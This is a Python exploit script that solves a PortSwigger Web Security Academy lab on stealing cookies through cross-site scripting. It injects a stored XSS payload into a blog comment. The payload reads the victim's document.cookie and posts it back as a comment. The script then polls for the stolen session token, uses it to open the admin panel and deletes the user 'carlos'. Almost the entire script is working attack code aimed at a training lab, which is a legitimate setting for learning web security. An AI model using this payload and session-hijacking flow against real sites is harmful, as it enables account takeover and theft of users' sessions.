#!/usr/bin/env python3
# Exploiting XSS to steal cookies — PortSwigger Web Security Academy

import requests
import re
import time
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ⚠️ Open the lab in your browser, copy the current URL, and paste it here (without any path)
LAB = "https://0acb00b903313953803dda0f005300c3.web-security-academy.net"
POST_ID = "8"

s = requests.Session()
s.verify = False

def get_csrf(url, sess):
    r = sess.get(url)
    print(f"[*] GET {url} → status {r.status_code}")
    if r.status_code != 200:
        raise SystemExit(f"[-] Page returned {r.status_code} — the lab has likely expired, reopen it and update the URL")

    tag = re.search(r'<input[^>]*\bname=["\']csrf["\'][^>]*>', r.text)
    if not tag:
        print("[-] CSRF tag not found. First 500 characters of the page:")
        print(r.text[:500])
        raise SystemExit("[-] Either the lab expired, or the URL is not for the correct post")
    v = re.search(r'value="([^"]+)"', tag.group(0))
    if not v:
        raise SystemExit("[-] Found the csrf tag but it has no value attribute")
    return v.group(1)

# ---------- Check if the lab is alive ----------
r0 = s.get(LAB)
print(f"[*] Lab check: {r0.status_code}")
if r0.status_code != 200 or "expired" in r0.text.lower():
    raise SystemExit("[-] Lab is not available — reopen it in your browser and copy the new URL")

post_url = f"{LAB}/post?postId={POST_ID}"
csrf = get_csrf(post_url, s)
print(f"[+] CSRF Token: {csrf}")

# ---------- The payload ----------
# Why the previous version failed: the script executed before the browser
# parsed the comment form (which contains the csrf field), because in the HTML
# the comments come BEFORE the form. So getElementsByName("csrf")[0] was
# undefined → JS error → no fetch was ever sent.
# Fix: retry every 250ms until the csrf field exists in the DOM.
payload = """<script>
function exfil(){
    var t = document.querySelector('input[name=csrf]');
    if(!t){ setTimeout(exfil, 250); return; }
    var d = new FormData();
    d.append('csrf', t.value);
    d.append('postId', '__POST_ID__');
    d.append('comment', 'STOLEN:' + document.cookie);
    d.append('name', 'victim');
    d.append('email', 'victim@example.com');
    d.append('website', '');
    fetch('/post/comment', {method:'POST', body:d});
}
exfil();
</script>""".replace("__POST_ID__", POST_ID)

r = s.post(f"{LAB}/post/comment", data={
    "csrf": csrf,
    "postId": POST_ID,
    "comment": payload,
    "name": "attacker",
    "email": "attacker@example.com",
    "website": "",
})
print(f"[+] Comment posted (status {r.status_code})")

# ---------- Verify the script is actually rendered ----------
page = s.get(post_url).text
if "function exfil" in page:
    print("[+] Script is rendered on the page — the victim will visit within seconds...")
else:
    print("[!] WARNING: script not found on the page — the filter may have blocked it (check if tags are HTML-encoded: &lt;script&gt;)")

# ---------- Wait for the stolen cookie ----------
stolen = None
for i in range(90):
    time.sleep(2)
    resp = s.get(post_url)
    if resp.status_code != 200:
        raise SystemExit("[-] The lab expired while waiting — reopen it and re-run the script")
    m = re.search(r"STOLEN:session(?:%3D|=)([A-Za-z0-9]+)", resp.text)
    if m:
        stolen = "session=" + m.group(1)
        print(f"[+] 🍪 Stolen Cookie: {stolen}")
        break
    if i % 5 == 0:
        print(f"    ... {i*2} seconds elapsed")

if not stolen:
    raise SystemExit("[-] Cookie not received within 3 minutes — try the Collaborator plan below")

# ---------- Access /admin with the victim's session and delete carlos ----------
admin = requests.Session()
admin.verify = False
admin.cookies.set("session", stolen.split("=", 1)[1],
                  domain=urllib.parse.urlparse(LAB).netloc)

r = admin.get(f"{LAB}/admin")
print(f"[*] /admin → status {r.status_code}")
if r.status_code != 200:
    raise SystemExit("[-] No access to admin panel — stolen cookie doesn't have admin privileges?")

tag = re.search(r'<input[^>]*\bname=["\']csrf["\'][^>]*>', r.text)
params = {"username": "carlos"}
if tag:
    v = re.search(r'value="([^"]+)"', tag.group(0))
    if v:
        params["csrf"] = v.group(1)

r = admin.get(f"{LAB}/admin/delete", params=params)
print(f"[*] /admin/delete → status {r.status_code}")

final = admin.get(LAB)
if "congratulations" in final.text.lower():
    print("[+] ✅ Lab solved — carlos deleted")
else:
    print("[?] Verify manually: open /admin with the stolen cookie and check if carlos was deleted")